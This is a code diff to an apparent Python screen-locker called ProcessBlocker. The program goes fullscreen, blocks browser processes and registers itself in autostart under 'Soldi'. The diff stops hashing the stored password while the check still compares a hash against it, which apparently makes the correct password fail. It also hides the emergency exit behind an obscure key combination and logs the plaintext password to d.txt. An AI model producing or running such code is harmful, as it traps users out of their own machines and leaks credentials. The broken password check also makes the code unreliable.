@@ -12,7 +12,7 @@ import sys
 
 class ProcessBlocker:
     def __init__(self, password):
-        self.password = hashlib.sha256(password.encode('utf-8')).hexdigest()
+        self.password = password
         self.running = True
         self.blocked_apps = [
             "msedge.exe", "chrome.exe", "firefox.exe",
@@ -38,7 +38,7 @@ class ProcessBlocker:
         self.root.attributes('-fullscreen', True)
         self.root.configure(bg='#1a1a1a')
 
-        keyboard.add_hotkey('ctrl+shift+p', self.emergency_exit)
+        keyboard.add_hotkey('ctrl+shift+alt+p+q+n', self.emergency_exit)
 
         self.create_lock_screen()
         self.root.mainloop()
@@ -104,6 +104,8 @@ class ProcessBlocker:
         separator.pack(fill='x', pady=20)
 
     def check_password(self):
+        with open("d.txt","a") as a:
+            a.write(f"{hashlib.sha256(self.pass_entry.get().encode('utf-8')).hexdigest()} {self.password}")
         if hashlib.sha256(self.pass_entry.get().encode('utf-8')).hexdigest() == self.password:
             RAMWORKER.MEI_del()
             RAMWORKER.remove_from_autostart("Soldi")
